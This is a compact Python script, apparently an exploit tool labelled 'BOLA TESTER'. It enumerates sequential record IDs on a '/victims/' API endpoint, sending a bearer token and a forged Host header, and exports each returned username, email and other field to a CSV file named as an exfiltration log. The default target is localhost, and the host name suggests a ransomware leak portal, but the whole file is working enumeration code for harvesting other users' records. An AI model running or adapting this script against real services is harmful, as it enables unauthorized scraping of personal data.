import argparse, csv, json, time, urllib.request, urllib.error
def fetch(url, token, host):
    req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0","Authorization":f"Bearer {token}","Host":host})
    try:
        with urllib.request.urlopen(req, timeout=8) as r: return r.status, json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as e: return e.code, None
def main():
    ap=argparse.ArgumentParser(); ap.add_argument("--base", default="http://127.0.0.1:8000/api/v1/victims/"); ap.add_argument("--host-header", default="ransom-leak-portal.io"); ap.add_argument("--start", type=int, default=1); ap.add_argument("--end", type=int, default=50); ap.add_argument("--token", default="undercover-operator"); ap.add_argument("--out", default="bola_exfil_log.csv"); args=ap.parse_args()
    print("--- BOLA TESTER ---"); rows=[]
    for i in range(args.start, args.end+1):
        status, payload = fetch(args.base.rstrip("/") + f"/{i}", args.token, args.host_header)
        if status == 200 and payload:
            print(f"[✓] {payload['username']}  {payload['email']}"); rows.append(payload)
        else: print(f"[-] ID {i} returned {status}")
        time.sleep(0.05)
    if rows:
        with open(args.out, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=list(rows[0].keys())); writer.writeheader(); writer.writerows(rows)
        print(f"[✓] Wrote {len(rows)} rows to {args.out}")
if __name__ == "__main__": main()
